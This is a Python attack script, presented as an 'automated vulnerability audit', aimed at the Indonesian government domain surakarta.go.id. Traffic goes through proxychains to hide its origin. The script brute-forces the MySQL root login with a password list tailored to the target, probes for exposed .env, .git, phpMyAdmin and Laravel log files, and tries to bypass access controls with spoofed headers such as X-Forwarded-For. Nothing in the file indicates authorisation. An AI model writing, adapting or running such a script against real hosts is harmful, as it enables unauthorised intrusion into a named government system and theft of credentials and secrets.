
import subprocess, sys, time, random

# --- CONFIGURATION ---
TARGET_HOST = "surakarta.go.id"
MYSQL_USER = "root"
PROXY_CMD = "proxychains"  # Assumes proxychains4.conf is configured correctly

# Expanded Password List (Targeted + Common)
PASSWORDS = [
    # Top Targeted
    "root", "admin", "123456", "password", "surakarta", "surakarta123",
    "surakarta2023", "surakarta2024", "surakarta2025", "kotasurakarta",
    "pemerintah", "diskominfo", "merdeka", "dinkes", "admin123", "root123",
    "solo", "solo123", "surakarta1", "adminadmin", "password123",
    # Service Specific
    "pure-pw", "mariadb", "mysql", "12345678", "qwerty", "toor",
    "1234567890", "webmaster", "administrator", "changeme", "monitor",
    "backup", "dbadmin", "sysadmin", "manager", "support"
]

# Web Paths to Check (Port 80/443/8080)
WEB_PATHS = [
    "/.env", "/public/.env", "/.git/HEAD", "/.git/config", 
    "/phpmyadmin/", "/pma/", "/admin/", "/login/", "/up/",
    "/storage/logs/laravel.log", "/public/up/"
]

# HTTP Headers for WAF Bypass
HEADERS = [
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Original-URL": "/.env"}, # Will be updated dynamically
    {"Host": "localhost"}
]

def print_status(msg, type="INFO"):
    colors = {
        "INFO": "\033[94m[*]\033[0m",  # Blue
        "SUCCESS": "\033[92m[+]\033[0m", # Green
        "FAIL": "\033[91m[-]\033[0m",    # Red
        "WARN": "\033[93m[!]\033[0m"     # Yellow
    }
    print(f"{colors.get(type, '[*]')} {msg}")

def check_proxy():
    print_status("Checking Proxy Health...", "INFO")
    try:
        # Check if we can reach Google or ifconfig.me
        cmd = [PROXY_CMD, "curl", "-s", "-m", "5", "https://ifconfig.me"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0 and result.stdout.strip():
            print_status(f"Proxy is ACTIVE. IP: {result.stdout.strip()}", "SUCCESS")
            return True
        else:
            print_status("Proxy check FAILED. Please check /etc/proxychains4.conf", "FAIL")
            return False
    except FileNotFoundError:
        print_status(f"Command '{PROXY_CMD}' not found. Install it first.", "FAIL")
        return False

def audit_mysql():
    print_status(f"Starting MySQL Brute Force on {TARGET_HOST}:3306", "INFO")
    for p in PASSWORDS:
        # Testing Password
        cmd = [PROXY_CMD, "mysql", "-h", TARGET_HOST, "-u", MYSQL_USER, f"-p{p}", "-e", "quit", "--skip-ssl"]
        try:
            # Short timeout to skip dead proxies
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0:
                print_status(f"MySQL PASSWORD FOUND: '{p}'", "SUCCESS")
                with open("mysql_found.txt", "w") as f:
                    f.write(f"Host: {TARGET_HOST}\nUser: {MYSQL_USER}\nPass: {p}\n")
                return True
            elif "Access denied" in result.stderr:
                print(f"\r[-] Tested: {p} (Denied)      ", end="")
            else:
                print(f"\r[!] Error/Timeout on: {p}      ", end="")
        except subprocess.TimeoutExpired:
            print(f"\r[!] Timeout on: {p}              ", end="")
        except Exception as e:
            print(f"\n[!] Script Error: {e}")
            
    print("\n")
    print_status("MySQL Brute Force Completed. No password found.", "WARN")
    return False

def audit_web(port=443, proto="https"):
    base_url = f"{proto}://{TARGET_HOST}:{port}"
    print_status(f"Scanning Web Paths on {base_url}", "INFO")
    
    for path in WEB_PATHS:
        full_url = f"{base_url}{path}"
        # Basic Check
        cmd = [PROXY_CMD, "curl", "-I", "-k", "-s", "-m", "10", full_url]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            status_line = result.stdout.split('\n')[0] if result.stdout else ""
            
            if "200 OK" in status_line:
                print_status(f"FOUND: {full_url} (200 OK)", "SUCCESS")
            elif "403 Forbidden" in status_line:
                # Try Bypass
                print_status(f"403 Detected at {path}. Attempting Bypass...", "WARN")
                bypass_waf(full_url)
            elif "301" in status_line or "302" in status_line:
                print(f"\r[*] Redirect: {path} -> {status_line}", end="")
            else:
                print(f"\r[*] Checked: {path} ({status_line.strip()})", end="")
                
        except Exception as e:
            pass
    print("\n")

def bypass_waf(url):
    for h in HEADERS:
        # Construct header string for curl, e.g., "X-Originating-IP: 127.0.0.1"
        header_str = list(h.keys())[0] + ": " + list(h.values())[0]
        cmd = [PROXY_CMD, "curl", "-I", "-k", "-s", "-m", "10", "-H", header_str, url]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            if "200 OK" in result.stdout:
                print_status(f"BYPASS SUCCESS! URL: {url} | Header: {header_str}", "SUCCESS")
                return
        except: pass

def main():
    print("\n=== AUTOMATED VULNERABILITY AUDIT: Surakarta.go.id ===\n")
    
    if not check_proxy():
        sys.exit(1)
        
    # Phase 1: MySQL (Highest Value)
    audit_mysql()
    
    # Phase 2: Web Port 8080 (ISPConfig / Admin)
    print_status("Checking Port 8080 (Admin Panel)...", "INFO")
    audit_web(port=8080, proto="https")
    
    # Phase 3: Web Port 443 (Laravel / .env)
    print_status("Checking Port 443 (Public Web)...", "INFO")
    audit_web(port=443, proto="https")

    print("\n=== AUDIT COMPLETE ===")

if __name__ == "__main__":
    main()
